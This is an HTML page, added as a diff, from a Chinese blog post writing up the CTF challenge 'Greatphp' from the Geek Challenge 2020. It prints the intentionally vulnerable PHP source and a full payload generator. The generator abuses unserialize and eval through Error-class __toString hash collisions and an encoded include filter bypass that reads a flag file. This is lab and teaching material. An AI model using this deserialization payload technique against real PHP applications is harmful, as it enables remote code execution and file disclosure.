@@ -1,0 +1,502 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="这道题需要用到 php原生类,对我来说算是一道比较新颖的题目,涨姿势了.
+相关技巧已归纳到 phpbypass">
+  <meta name="author" content="Noel">
+  <meta name="keywords" content="">
+  
+  <title>极客大挑战2020Greatphp - Noel&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"n0el4kls.github.io","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>N0el4kLs's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/web_source/shine.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="极客大挑战2020Greatphp">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-14 22:27" pubdate>
+        2021年8月14日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      16
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">极客大挑战2020Greatphp</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：几秒前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <p>这道题需要用到 <code>php</code>原生类,对我来说算是一道比较新颖的题目,涨姿势了.</p>
+<p>相关技巧已归纳到 <a href="/2021/08/03/phpbypass/" title="phpbypass">phpbypass</a></p>
+<span id="more"></span>
+
+<h1 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202020]Greatphp">[极客大挑战 2020]Greatphp</a></p>
+<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>进入题目,给出源码,直接开始审计.</p>
+<h2 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-keyword">$this</span>-&gt;syc != <span class="hljs-keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="hljs-keyword">$this</span>-&gt;syc) === md5(<span class="hljs-keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="hljs-keyword">$this</span>-&gt;syc)=== sha1(<span class="hljs-keyword">$this</span>-&gt;lover)) )&#123;<br>            <span class="hljs-comment">// 有个md5以及sha1强比较</span><br>            <span class="hljs-comment">// 且存在一个关键字检测</span><br>           <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;syc);<br>              <span class="hljs-comment">// 危险函数 eval</span><br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>           &#125;<br>           <br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;<br>    unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]);<br>    <span class="hljs-comment">// 发现危险函数 unserialize() 且传入参数可控</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>简单审计代码后,可以大致确定利用链:</p>
+<ul>
+<li>构造序列化字符串传入<code>unserialize()</code></li>
+<li>绕过条件比较</li>
+<li>且构造的payload符合正则匹配</li>
+</ul>
+<p>通常,<code>md5()</code>以及<code>sha1()</code>我们可以使用数组类型绕过,但此处肯定是行不通的,如果是数组,那将没办法通过<code>eval</code>执行</p>
+<h2 id="原生类利用"><a href="#原生类利用" class="headerlink" title="原生类利用"></a>原生类利用</h2><p>虽然无法通过数组类型绕过,但是,当<code>md5()</code>以及<code>sha1()</code>对一个类进行<code>hash</code>的时候会触发<code>__toSring()</code>函数,且当执行到 <code>eval()</code>时,也会触发<code>__toString</code>().</p>
+<p>于是,我们可以使用包含<code>__toString()</code>方法的类来绕过,最好是<code>__toString()</code>的返回结果可以被我们控制.</p>
+<p> 用的最多的就是<code>Exception</code>和<code>Error</code>,因为两个类中包含了<code>__toString</code>方法.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Error</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Throwable</span> </span>&#123;<br><span class="hljs-comment">/* Properties */</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$line</span>;<br><span class="hljs-comment">/* Methods */</span><br><span class="hljs-keyword">public</span> __construct(<span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span>, ?<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$previous</span> = <span class="hljs-literal">null</span>)<br><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> getMessage(): <span class="hljs-keyword">string</span><br><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> getPrevious(): ?<span class="hljs-built_in">Throwable</span><br><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> getCode(): <span class="hljs-keyword">int</span><br><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> getFile(): <span class="hljs-keyword">string</span><br><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> getLine(): <span class="hljs-keyword">int</span><br><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> getTrace(): <span class="hljs-keyword">array</span><br><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> getTraceAsString(): <span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> __toString(): <span class="hljs-keyword">string</span><br><span class="hljs-keyword">final</span> <span class="hljs-keyword">private</span> __clone(): <span class="hljs-keyword">void</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exception</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Throwable</span> </span>&#123;<br><span class="hljs-comment">/* Properties */</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$line</span>;<br><span class="hljs-comment">/* Methods */</span><br><span class="hljs-keyword">public</span> __construct(<span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span>, ?<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$previous</span> = <span class="hljs-literal">null</span>)<br><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> getMessage(): <span class="hljs-keyword">string</span><br><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> getPrevious(): ?<span class="hljs-built_in">Throwable</span><br><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> getCode(): <span class="hljs-keyword">int</span><br><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> getFile(): <span class="hljs-keyword">string</span><br><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> getLine(): <span class="hljs-keyword">int</span><br><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> getTrace(): <span class="hljs-keyword">array</span><br><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> getTraceAsString(): <span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> __toString(): <span class="hljs-keyword">string</span><br><span class="hljs-keyword">final</span> <span class="hljs-keyword">private</span> __clone(): <span class="hljs-keyword">void</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>本地搭环境测试一下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;hellophp&quot;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;helloweb&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2021-08-14-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020Greatphp/image-20210814225705709.png" srcset="/img/loading.gif" lazyload alt="image-20210814225705709"></p>
+<p>可以看到输出中包含了我们输入的字符串</p>
+<blockquote>
+<p>注意: Error会包含语句所在行.如果要判断相等,得在定义时就在同一行.</p>
+</blockquote>
+<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>有上面原生类的知识后,我们很容易绕过<code>md1()</code>和<code>sha1()</code>.</p>
+<p>接下来要绕过正则匹配</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))<br></code></pre></td></tr></table></figure>
+
+<p><code>&lt;?php</code>可以使用<code>php</code>短标签<code>&lt;?=</code>绕过( <?=$a; ?> means  <?php echo $a;?>),由于过滤了括号,绝大多数函数都没办法使用,但是 <code>include</code>可以.想办法去 <code>include &#39;/flag&#39;</code> ,由于<code>&#39;&#39;</code>和<code>&quot;&quot;</code>也都被检测,这里使用去取反绕过.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> urlencode(~<span class="hljs-string">&quot;/flag&quot;</span>);<br><span class="hljs-comment">// 得到 %D0%99%93%9E%98</span><br></code></pre></td></tr></table></figure>
+
+<p>到目前位置我们构造payload为:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-keyword">$this</span>-&gt;syc != <span class="hljs-keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="hljs-keyword">$this</span>-&gt;syc) === md5(<span class="hljs-keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="hljs-keyword">$this</span>-&gt;syc)=== sha1(<span class="hljs-keyword">$this</span>-&gt;lover)) )&#123;<br>           <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;syc);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>           &#125;<br>           <br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> SYCLOVER();<br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&#x27;&lt;?=include ~%D0%99%93%9E%98&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>但此时还没有结束,我们还得在<code>&lt;?=include ~%D0%99%93%9E%98</code>的前面加上<code>?&gt;</code></p>
+<p>原因:因为 <code>Exception</code>类与 <code>Error </code>的 __toString 方法在<code>eval()</code>函数中输出的结果是不可能控的，即输出的报错信息中，payload前面还有一段杂乱信息“Error: ”</p>
+<p><img src="/images/2021-08-14-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020Greatphp/image-20210815025434886.png" srcset="/img/loading.gif" lazyload alt="image-20210815025434886"></p>
+<p>完整payload构造如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-keyword">$this</span>-&gt;syc != <span class="hljs-keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="hljs-keyword">$this</span>-&gt;syc) === md5(<span class="hljs-keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="hljs-keyword">$this</span>-&gt;syc)=== sha1(<span class="hljs-keyword">$this</span>-&gt;lover)) )&#123;<br>           <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;syc);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>           &#125;<br>           <br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> SYCLOVER();<br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&#x27;;?&gt;&lt;?=include ~&#x27;</span>.urldecode(<span class="hljs-string">&#x27;%D0%99%93%9E%98&#x27;</span>).<span class="hljs-string">&#x27;;?&gt;&#x27;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-number">2</span>);<br><span class="hljs-variable">$a</span>-&gt;syc = <span class="hljs-variable">$b</span><br><span class="hljs-variable">$a</span>-&gt;lover = <span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2021-08-14-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020Greatphp/image-20210815032840865.png" srcset="/img/loading.gif" lazyload alt="image-20210815032840865"></p>
+<p>拿到flag</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>第一次做这中类型的题目,收获很多,同时也学会了正则绕过的新姿势.</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://johnfrod.top/ctf/2020-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98greatphp/">https://johnfrod.top/ctf/2020-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98greatphp/</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.myangswhitehat.cn/2021/01/23/46/">http://www.myangswhitehat.cn/2021/01/23/46/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">刷题记录</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/php/">php</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/13/nodejs6/">
+                        <span class="hidden-mobile">nodejs(六)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
